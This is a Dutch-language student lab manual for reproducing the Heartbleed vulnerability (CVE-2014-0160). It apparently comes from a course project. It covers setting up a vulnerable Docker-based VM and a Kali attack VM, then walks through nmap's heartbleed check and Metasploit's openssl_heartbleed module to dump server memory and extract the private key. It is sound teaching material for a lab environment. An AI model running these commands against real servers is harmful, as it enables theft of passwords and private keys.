# Handleiding - CVE-2014-0160

## Problemen met CVE-2014-0160 op Ubuntu 12.04 VM (Troubleshooting)

We probeerden eerst alles zelf te installeren via scripts, maar stuitten op veel problemen.

Het eerste probleem was het vinden van een potentieel kwetsbare VM. Op osboxes vonden we een geschikte VM met **Ubuntu 12.04**, die een kwetsbare versie van OpenSSL bevatte, namelijk **OpenSSL 1.0.1**.

Het volgende probleem ontstond kort na de download. De 64-bit versie van deze VM werkte helemaal niet. Dit hadden we echter eenvoudig kunnen oplossen door met de **32-bit** versie te werken. Toen de VM eenmaal opgestart was, stuitten we op het volgende probleem: omdat de VM niet meer werd ondersteund, konden we geen pakketten installeren of updaten. Om dit op te lossen hebben we het **sources.list** bestand aangepast in **/etc/apt/sources.list**. Daar hebben we alles aangepast naar old-releases om toch nog packages te downloaden. Zo konden we uiteindelijk de services downloaden na **sudo apt-get update** uit te voeren.

De volgende stap, en daarmee het volgende probleem, was het toevoegen van SSL aan de webserver om deze kwetsbaar te maken. Dit was de laatste en enige stap waar we niet in zijn geslaagd. We hebben verschillende versies van SSL gedownload en toegepast, maar steeds met hetzelfde resultaat: een VM die niet kwetsbaar was. We hebben diverse openssl versies geprobeerd (bv. via hier https://ftp.openssl.org/source/old/1.0.1/), maar alles was gepatched.

Als oplossing hebben we gekozen voor een Docker-container die we kunnen deployen om zo de exploit uit te voeren. Op deze manier werkte de kwetsbaarheid en konden we het nog steeds automatiseren.

## Deploy stappenplan

### 1) Ubuntu 22.04 VM

Voor het opzetten van de vulnerable omgeving gebruiken we het automatisatie.ps1 script.

```bash
.\CSV-NPE-2324\debian> .\automatisatie.ps1
```

Bij het uitvoeren van het script zal gevraagd worden als welke gebruiker je het script wenst uit te voeren en hierbij zal je dan het toepasselijke nummer moeten ingeven:

```bash
Kies de gebruiker voor de VM setup (Kies '1' voor Jasper, '2' voor Quinten, '3' voor Jorik, '4' voor een custom path):
```

Na het kiezen van deze gebruiker zal het script de Ubuntu VM automatisch aanmaken en opstarten en zal je het volgende op je scherm krijgen:

```
Druk op enter om de omgeving op te zetten wanneer de VM is opgestart:
```

Nadat je VM opgestart is en je op enter klikt, zal automatisch het [script2.sh](../debian/script2.sh) script uitgevoerd worden en die zal docker installeren, de docker image pullen en de docker container uitvoeren en zo is de kwetsbare omgeving opgezet.

### 2) Kali VM

Voor het opzetten van de attack VM zullen we het automatisatie.ps1 script in de kali map moeten uitvoeren:

```bash
.\CSV-NPE-2324\kali> .\automatisatie.ps1
```

Bij het uitvoeren van het script zal gevraagd worden als welke gebruiker je het script wenst uit te voeren en hierbij zal je dan het toepasselijke nummer moeten ingeven:

```bash
Kies de gebruiker voor de VM setup (Kies '1' voor Jasper, '2' voor Quinten, '3' voor Jorik, '4' voor een custom path):
```

Hierna zal het script de Kali VM automatisch aanmaken en opstarten. De nodige services (nmap & msfconsole) zijn reeds automatisch geïnstalleerd op deze VM.

## Attack stappenplan
### 1) Verkennen

1. Eerst moeten we het IP-adres zoeken van de kwetsbare VM.
```bash
ip a
```
2. Dan kunnen we volgend commando uitvoeren om te achterhalen of de service kwetsbaar is:
```bash
nmap -sV --script=ssl-heartbleed <ip-adres>
```

### 2) Voorbereiding attack
1. Nu we weten dat hij kwetsbaar is kunnen we via Metasploid de aanval uitvoeren
2. We openen de Metasploid Framework console
```bash
msfconsole
```
3. Daarna moeten we zoeken naar een script dat we kunnen gebruiken
```bash
search openssl_heartbleed
```
4. We kiezen de enige mogelijke optie
```bash
use auxiliary/scanner/ssl/openssl_heartbleed
```
5. nu moeten we het juiste ip addres kiezen
```bash
set rhost ip addres
```
6. nu moeten de juiste poort van onze docker container gebruiken
```bash
set rport 8443
```
7. Belangrijk om volledig overzicht te krijgen 
```bash
set VERBOSE true
```
### 3) Attack uitvoeren

1. We gaan controleren of de Virtuele Machine vatbaar is voor de Heartbleed-aanval
```bash        
set action scan
run
```
2. We gaan proberen om gevoelige informatie uit het geheugen van de VM te dumpen. Heartbleed stelt aanvallers in staat om onbedoeld geheugen van de server te lezen, dus deze actie kan gevoelige gegevens zoals wachtwoorden ophalen.
```bash
set action dump
run
```
3. Met deze opdracht stel je in dat Metasploit probeert de privésleutel van de VM te verkrijgen. Als de Heartbleed-aanval succesvol is, kan dit leiden tot het verkrijgen van de privésleutel, waardoor aanvallers gevoelige communicatie kunnen ontsleutelen.
```bash
set action key
run
```